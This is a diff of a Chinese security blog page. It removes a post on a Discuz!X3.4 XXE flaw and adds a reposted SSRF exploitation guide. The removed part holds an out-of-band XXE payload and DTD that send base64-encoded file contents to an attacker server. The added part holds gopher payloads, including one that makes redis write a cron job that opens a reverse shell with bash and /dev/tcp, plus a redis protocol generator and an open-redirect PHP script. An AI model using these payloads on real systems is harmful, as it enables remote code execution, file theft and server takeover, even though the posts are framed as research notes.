@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Discuz!X3.4前台XXE漏洞, Joker">
-    <meta name="description" content="DiscuzX代码审计">
+    <meta name="keywords" content="SSRF漏洞研究[转载], Joker">
+    <meta name="description" content="SSRF漏洞研究[转载]">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Discuz!X3.4前台XXE漏洞 | Joker</title>
+    <title>SSRF漏洞研究[转载] | Joker</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -304,12 +304,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Discuz!X3.4前台XXE漏洞</h1>
+                    <h1 class="description center-align post-title">SSRF漏洞研究[转载]</h1>
                 </div>
             </div>
         </div>
@@ -424,25 +424,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/Discuz/">
-                                <span class="chip bg-color">Discuz</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
-                                代码审计
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -451,28 +438,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-30
+                    2020-04-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-03-30
+                    2020-04-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    749
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    7 分
                 </div>
                 
 				
@@ -488,22 +475,131 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>比较幸运，刚学完XXE漏洞，转身给我爆了一个XXE。不过有php版本限制</p>
-<h2 id="0x02漏洞环境"><a href="#0x02漏洞环境" class="headerlink" title="0x02漏洞环境"></a>0x02漏洞环境</h2><p>Discuz!X3.4最新版<br>php5.4.45</p>
-<h2 id="0x03影响范围"><a href="#0x03影响范围" class="headerlink" title="0x03影响范围"></a>0x03影响范围</h2><p>漏洞点出在dz中的微信接口处，经过测试需要PHP&lt;=5.4.45因为高版本中的<code>simplexml_load_string</code>已经不在默认加载LIBXML_NOENT，合理猜测所有有微信插件的版本都可能存在，因为没找到旧版本就没测试。</p>
-<h2 id="0x04漏洞分析"><a href="#0x04漏洞分析" class="headerlink" title="0x04漏洞分析"></a>0x04漏洞分析</h2><p>漏洞文件：/source/plugin/wechat/wechat.lib.class.php<br><img src="/1944236470/1.png" alt><br>可以发现<code>simplexml_load_string</code>中的<code>$postdata</code>我们可以控制（可以看一下<code>simplexml_load_string</code>新版本和旧版本的区别），而到这只经过了两次<code>_checkSignature</code>，跟进看一下<br><img src="/1944236470/2.png" alt><br>大致就是进行一个token的检验，其中参数可控，而如果我们知道token的值就能进行伪造，看一下token是如何传进来的，发现是在实体化WeChatServer类的时候进行的初始化<br><img src="/1944236470/3.png" alt><br>直接全局搜索<code>WeChatServer</code><br>在文件/source/plugin/mobile/api/4/wechat.php中进行了实体化<br><img src="/1944236470/4.png" alt><br><code>$_G[&#39;wechat&#39;][&#39;setting&#39;][&#39;wechat_token&#39;]</code>就是我们的token，是由<code>$_G[&#39;setting&#39;][&#39;mobilewechat&#39;]</code>反序列化来的，我们调试一下看看mobilewechat的值，先找一下入口文件，位置在<code>/source/plugin/mobile/mobilie.php</code><br><img src="/1944236470/5.png" alt><br>构造url:<code>http://127.0.0.1/source/plugin/mobile/mobile.php?module=wechat</code><br><img src="/1944236470/6.png" alt><br>可以发现默认的mobilewechat是null，而这样的话token也是null，<br><img src="/1944236470/7.png" alt><br>直接跟进到<code>_checkSignature</code>函数，看<code>$tmpStr</code>的值<br><img src="/1944236470/8.png" alt><br>可以看到<code>$tmpStr</code>的值就是一个3个空值数组的sha1值，此时<code>$tmpStr</code>可知，可直接通过<code>$signatur</code>传值绕过。至此，我们就可以通过<code>$postdata</code>穿payload进行XXE。我们在回头看一下wexin_token的值是怎么产生的<br>文件位置<code>source\plugin\wechat\install\checkupdate.inc.php</code><br><img src="/1944236470/9.png" alt><br>回溯发现，wechat_token是随机产生的一个16位字符，不可控。<br><img src="/1944236470/10.png" alt><br>这里也可以知道为什么token为null了，只有在安装了微信插件的时候才会生成token，而默认配置则是空，这就能直接前台xxe了<br><img src="/1944236470/11.jpg" alt><br>再继续看，既然token不可控，在看是否能获取。发现，在后台微信设置处能进行设置，但这就要后台权限了。懒得上图了……<br>总结：攻击思路两条，1.默认配置–》token=null–》xxe      2.开启微信插件–》后台–》获取token–&gt;xxe</p>
-<h2 id="0x05漏洞复现"><a href="#0x05漏洞复现" class="headerlink" title="0x05漏洞复现"></a>0x05漏洞复现</h2><p>不多bb，无回显的xxe，需要oob。<br>url=<code>http://www.123.com/source/plugin/mobile/mobile.php?module=wechat&amp;signature=da39a3ee5e6b4b0d3255bfef95601890afd80709</code></p>
-<p>然后post：</p>
-<pre><code>&lt;!DOCTYPE convert [ 
-&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
-%remote;%int;%send;
-]&gt;</code></pre><p>test.dtd：</p>
-<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt&quot;&gt;
-&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:10888?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>可以看到vps上成功拿到了test.txt的base64后的数据<br><img src="/1944236470/11.png" alt></p>
-<h2 id="0x06漏洞修复"><a href="#0x06漏洞修复" class="headerlink" title="0x06漏洞修复"></a>0x06漏洞修复</h2><ol>
-<li>禁用外部实体<br><code>libxml_disable_entity_loader(true);</code></li>
-<li>黑名单过滤<br>对一下字符进行过滤<br><code>&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</code></li>
+                <h1 id="声明："><a href="#声明：" class="headerlink" title="声明："></a>声明：</h1><p>本文转载自：<img src="https://github.com/xinali/articles/issues/16" alt></p>
+<p>感觉这个师傅的很多细节是自己没有涉及的，转载保存一下。</p>
+<h1 id="SSRF-利用"><a href="#SSRF-利用" class="headerlink" title="SSRF 利用"></a><code>SSRF 利用</code></h1><p>SSRF目前我所见过的主要攻击本地服务器主要有两种方式一个是利用redis，另一种是利用Memcached<br>进行SSRF攻击，利用最多的库就是<code>libcurl</code>，比如php中的<code>curl_exec</code>，<code>curl</code>命令行等，可以先具体看看curl在SSRF中的作用。</p>
+<h2 id="SSRF-客户端主要利用方式"><a href="#SSRF-客户端主要利用方式" class="headerlink" title="SSRF 客户端主要利用方式"></a><code>SSRF 客户端主要利用方式</code></h2><h3 id="curl支持的协议"><a href="#curl支持的协议" class="headerlink" title="curl支持的协议"></a><code>curl支持的协议</code></h3><p>查看<code>curl</code>支持的协议</p>
+<pre><code># curl -V
+Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp </code></pre><p>我们通过使用curl的几个协议可以知道，入侵主机的一些程序信息</p>
+<ol>
+<li>dict</li>
 </ol>
+<pre><code>attacker.com $ curl &#39;dict://victim.com:2323&#39;
+victim.com   $ nc -lvvp 2323 Listening on [0.0.0.0] (family 0, port 2323)                               
+Connection from xxx 33442 received!  
+CLIENT libcurl 7.47.0</code></pre><ol>
+<li>sftp</li>
+</ol>
+<pre><code>attacker.com $ curl &#39;dict://victim.com:2323&#39;
+evil.com     $ nc -v -l 11111
+Listening on [0.0.0.0] (family 0, port 11111)
+Connection from [54.166.236.232] port 11111 [tcp/*] accepted (family 2, sport 35789)
+CLIENT libcurl 7.40.0
+QUIT</code></pre><blockquote>
+<p>大部分的libcurl都不支持sftp协议，需要经过编译才能支持，所以一般这种探测都不会成功。不支持可以表现 在两个方面，一种是客户端的curl不支持发送sftp协议的数据，另一方面服务器端没有办法利用ssrf进行sftp的请求或接受该协议数据。</p>
+</blockquote>
+<ol>
+<li>gopher<br>gopher协议最简单的请求： gopher://127.0.0.1:2333/_test<br>gopher可以向任何端口发送任意形式的请求，例如http的post包：</li>
+</ol>
+<pre><code>gopher://test.com/_POST /exp.php HTTP/1.1%0d%0aHost: test.com_ip%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &gt;%2526 /dev/tcp/172.19.23.228/2333 0&gt;%25261null</code></pre><p>比如我们利用gopher发送符合redis协议的数据包，攻击本地的redis，首先产生redis数据协议，可以利用下面的脚本产生需要的redis协议数据，只要每个数据用<code>%0d%0a</code>分割即可</p>
+<pre><code>#!/bin/bash
+#
+# License: MIT
+# Author: Michael Weibel
+#
+gen_redis_protocol() {
+    cmd=$1
+    proto=&quot;&quot;
+    proto+=&quot;*&quot;
+
+    number_of_words=0
+    byword=&quot;&quot;
+    for word in $cmd
+    do
+        number_of_words=$[number_of_words+1]
+        byword+=&quot;$&quot;
+        byword+=${#word}
+        byword+=&quot;\\r\\n&quot;
+        byword+=$word
+        byword+=&quot;\\r\\n&quot;
+    done
+    proto+=${number_of_words}
+    proto+=&quot;\\r\\n&quot;
+    proto+=${byword}
+    printf $proto
+}
+gen_redis_protocol &quot;SET mykey Hello&quot;</code></pre><p>因为redis是通过<code>\r\n</code>即<code>%0d%0a</code>，来分割每条命令的，所以首先用上面的脚本生成符合redis协议的数据，之后利用<code>%0d%0a</code>合并即可，举个简单的例子</p>
+<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><p>实际上任何形式的报文都可以发，在下划线之后的内容既是报文内容，要注意url加密问题。<br>其中sftp和dict主要用于获取服务器端<code>libssh</code>和<code>libcurl</code>的版本信息，因为可以利用这两个软件的信息进行漏洞利用，gopher则可以直接进行攻击。</p>
+<blockquote>
+<p>libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237)</p>
+</blockquote>
+<h2 id="SSRF-起源-服务器后端语言"><a href="#SSRF-起源-服务器后端语言" class="headerlink" title="SSRF 起源---服务器后端语言"></a><code>SSRF 起源---服务器后端语言</code></h2><h3 id="SSRF-服务器端-php后端"><a href="#SSRF-服务器端-php后端" class="headerlink" title="SSRF 服务器端--php后端"></a><code>SSRF 服务器端--php后端</code></h3><p>如果利用php写的后端，那么php中可以触发ssrf的函数： <code>file_get_contents()</code>, <code>fsockopen()</code>, <code>curl_exec()</code>, <code>fopen()</code></p>
+<ol>
+<li><code>curl_exec()</code>，可以发送get请求和post请求：<br>curl如果前面不输入协议会自动走http协议， 默认情况下，curl不会跟踪302跳转，并且curl不支持php的伪协议，不用考虑文件包含漏洞。</li>
+</ol>
+<pre><code>$ http --follow --all -h http://172.16.1.4/test_curl_exec.php
+&lt;?php
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, &#39;http://172.16.1.4/302.php&#39;);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_HEADER, 1);
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); # 设置curl跟踪302跳转
+$response = curl_exec($curl);
+var_dump($response);
+curl_close($curl);
+?&gt;</code></pre><ol>
+<li><code>file_get_contents</code>只能get访问url，但是默认情况下就支持302跳转</li>
+</ol>
+<pre><code>$ http --follow --all -h http://172.16.1.4/test_curl_exec.php
+&lt;?php
+$response = file_get_contents(&quot;http://172.16.1.4/302.php&quot;);
+var_dump($response);
+?&gt;</code></pre><p>必须输入协议，比如<code>http://</code>，在<code>php5.6</code>和<code>php7.1.7</code>测试下都不支持gopher。</p>
+<blockquote>
+<p>同样该函数也是LFI(本地文件包含)漏洞需要重点关注的函数</p>
+</blockquote>
+<ol>
+<li>fsockopen需要自己写http报文，几乎不会有人用吧。 Fopen用的也很少，但是它是可以请求一个url的，如果php开启了 fopen 的 gopher wrapper，那么fopen就可以直接发送gopher请求。<br>能够运行的原因就是<code>curl</code>扩展支持<code>dict</code>和<code>file</code>协议，可以利用这些协议对主机进行相关的数据请求。普通的标签，比如<code>img</code>，<code>script</code>等基本都不会支持那么多的协议，就本就要想别的办法。</li>
+</ol>
+<h2 id="SSRF-提供某种服务-redis-memcache"><a href="#SSRF-提供某种服务-redis-memcache" class="headerlink" title="SSRF 提供某种服务--redis/memcache"></a><code>SSRF 提供某种服务--redis/memcache</code></h2><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a><code>redis</code></h3><p>redis支持的通信协议格式</p>
+<pre><code>*&lt;参数数量&gt; CR LF
+$&lt;参数 1 的字节数量&gt; CR LF
+&lt;参数 1 的数据&gt; CR LF
+...
+$&lt;参数 N 的字节数量&gt; CR LF
+&lt;参数 N 的数据&gt; CR LF</code></pre><p>具体可以打印出来的是这样的</p>
+<pre><code>*3
+$3
+SET
+$5
+mykey
+$7
+myvalue</code></pre><p>每行数据都是利用<code>\r\n</code>(<code>%0d0a</code>)分割的，只要能够发送这样的数据，redis都照常解析</p>
+<ol>
+<li><code>http</code> 协议<br>正常如果使用<code>http</code>协议请求<code>redis</code>，会出现这样的错误</li>
+</ol>
+<pre><code>$ curl &#39;http://212.24.111.64:6379/%0D%0Ainfo&#39;
+-ERR wrong number of arguments for &#39;get&#39; command
+-ERR unknown command &#39;User-Agent:&#39;
+-ERR unknown command &#39;Host:&#39;
+-ERR unknown command &#39;Accept:&#39;</code></pre><p>出现这样错误是因为<code>http</code>协议的头数据都是通过<code>\r\n</code>来分割的，redis解析这样的数据，所以就出现了上面的错误。如果想要通过<code>http</code>数据利用redis，那么服务器端进行远程(或本地)请求的函数必须存在<code>CRLF</code>这样<code>http</code>头解析漏洞。</p>
+<ol>
+<li>CRLF漏洞<br>如果目标服务器存在CRLF漏洞，对redis使用http请</li>
+</ol>
+<blockquote>
+<p>我根据数据报文格式和redis的通信协议，猜测redis就是解析tcp数据包，以<code>\r\n</code>即<code>%0D%0A</code>为分割线，分割成各个命令，所以如果存在CRLF漏洞，那么可以直接将命令注入报文中，redis解析之后直接执行命令！<br>比如redis支持<code>dict</code>协议</p>
+</blockquote>
+<pre><code>curl &#39;http://xx:6379/info&#39;
+curl &#39;http://xx:6379/config set dir /var/www/html&#39;</code></pre><p>ssrf在利用的过程中，经常会遇到某个应用”不支持”某种协议的情况，确切来说不是不支持，而是没有办法直接利用，举个例子，redis没有办法直接用<code>http</code>请求进行相关操作，如果直接用的话，会遇到这样的情况</p>
+<h3 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a><code>memcache</code></h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><code>参考链接</code></h2><p><a href="http://redisdoc.com/topic/protocol.html" target="_blank" rel="noopener">redis通信协议</a><br><a href="http://106.14.61.185/2016/12/07/ssrf/" target="_blank" rel="noopener">ssrf总结</a></p>
+<p>360识图ssrf：<a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0229611" target="_blank" rel="noopener">http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0229611</a><br>远程服务器脚本：</p>
+<pre><code>&lt;?php
+$ip = $_GET[&#39;ip&#39;];
+$port = $_GET[&#39;port&#39;];
+$scheme = $_GET[&#39;s&#39;];
+$data = $_GET[&#39;data&#39;];
+header(&quot;Location: $scheme://$ip:$port/$data&quot;);
+?&gt;</code></pre><p>ssrf=&gt; mysql 导致getshell：<a href="https://paper.seebug.org/510/" target="_blank" rel="noopener">https://paper.seebug.org/510/</a></p>
 <hr>
 <p>版权声明：</p>
 <p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p>
@@ -533,7 +629,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://blog.j0k3r.cn/1944236470.html">http://blog.j0k3r.cn/1944236470.html</a>
+                    <a href="http://blog.j0k3r.cn/2133607805.html">http://blog.j0k3r.cn/2133607805.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -570,11 +666,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/Discuz/">
-                                    <span class="chip bg-color">Discuz</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -613,9 +705,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2133607805.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="SSRF漏洞研究[转载]">
+                        
+                        <span class="card-title">SSRF漏洞研究[转载]</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            SSRF漏洞研究[转载]
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Joker
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/3983147628.html">
                     <div class="card-image">
@@ -633,45 +764,8 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-31
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Joker
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/3842592324.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="XXE漏洞学习笔记">
-                        
-                        <span class="card-title">XXE漏洞学习笔记</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            XXE漏洞学习笔记
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-31
                             </span>
                         <span class="publish-author">
                             
@@ -680,14 +774,6 @@
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/XXE%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">XXE漏洞</span>
-                    </a>
-                    
                 </div>
                 
             </div>
